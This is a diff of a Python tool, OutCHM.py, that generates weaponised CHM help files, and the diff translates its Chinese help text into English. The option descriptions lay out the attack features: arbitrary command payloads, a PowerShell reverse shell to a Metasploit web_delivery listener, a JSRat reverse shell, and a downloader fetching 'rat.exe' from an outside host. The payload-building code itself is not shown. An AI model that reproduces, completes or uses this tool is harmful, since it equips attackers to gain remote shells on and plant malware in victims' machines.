@@ -8,20 +8,20 @@ import argparse
 parser=argparse.ArgumentParser(
 prog='OutCHM', 
 formatter_class=argparse.RawDescriptionHelpFormatter,
-description='''OutCHM 可以Out一个CHM！ 
+description='''OutCHM can create OUT a CHM！ 
 
 OutCHM.py -r http://192.168.0.100:8080
 OutCHM.py -p 'whoami > c://1.txt'
 
 ''', 
-epilog='方便快捷！')
+epilog='Faster!')
 parser.add_argument('-p', '--payload', help='-p c:\\\windows\\\command')
-parser.add_argument('-r', '--rshell', help='-r http://192.168.0.100:8080，通过powershll反弹msf后门，需要 msf exploit(web_delivery)')
-parser.add_argument('-j', '--jsrat', help='-j http://192.168.0.100:8000，通过js反弹JSRat，需要 JSRat.py -i 192.168.0.100 -p 8000')
-parser.add_argument('-d', '--download', help='-d http://exp.com/rat.exe，喜闻乐见下载者')
+parser.add_argument('-r', '--rshell', help='-r http://192.168.0.100:8080，powershell reverse shell，need msf exploit(web_delivery)')
+parser.add_argument('-j', '--jsrat', help='-j http://192.168.0.100:8000，JS reverse shell，need JSRat.py -i 192.168.0.100 -p 8000')
+parser.add_argument('-d', '--download', help='-d http://exp.com/rat.exe，lucky to see u Downloader!')
 # parser.add_argument('-c', '--custom', help='-c http://192.168.0.100/exp.txt 执行在线脚本')
 parser.add_argument('-o', '--outfile', help='-o exp.chm', default='exp.chm')
-parser.add_argument('-dec', '--decompile', help='反编译chm文件')
+parser.add_argument('-dec', '--decompile', help='decompile chm file')
 args=parser.parse_args()
 
 if len(sys.argv) < 1:
@@ -29,7 +29,7 @@ if len(sys.argv) < 1:
 
 if args.decompile is not None:
     os.system('hh -decompile out {0}'.format(args.decompile))
-    print '已反编译到「out」目录。'
+    print 'decompiled to 「out」 dir。'
     sys.exit(0)
 
 command=' '
@@ -51,7 +51,7 @@ if args.download is not None:
 
 
 if command == ' ':
-    print '请输入参数'
+    print 'Error: args.any == None'
     sys.exit(0)
 
 exp_htm='''<!DOCTYPE html><html>
